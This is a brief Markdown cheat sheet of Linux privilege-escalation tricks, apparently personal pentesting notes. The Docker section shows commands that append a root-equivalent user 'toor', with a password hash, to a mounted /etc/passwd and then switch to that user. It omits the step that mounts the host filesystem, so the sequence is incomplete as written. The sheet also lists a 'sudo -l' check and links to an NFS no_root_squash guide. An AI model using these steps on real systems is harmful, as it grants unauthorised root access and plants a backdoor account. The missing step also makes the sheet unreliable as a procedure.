### Docker
How to spot
```
lse check user in docker group
```
Exploit
```
docker images
cd /
echo 'toor:$1$.ZcF5ts0$i4k6rQYzeegUkacRCvfxC0:0:0:root:/root:/bin/sh' >> /mnt/etc/passwd
su toor
password
```

### Check sudo
```
sudo -l
```

### no-root-squash nfs
https://book.hacktricks.xyz/linux-unix/privilege-escalation/nfs-no_root_squash-misconfiguration-pe
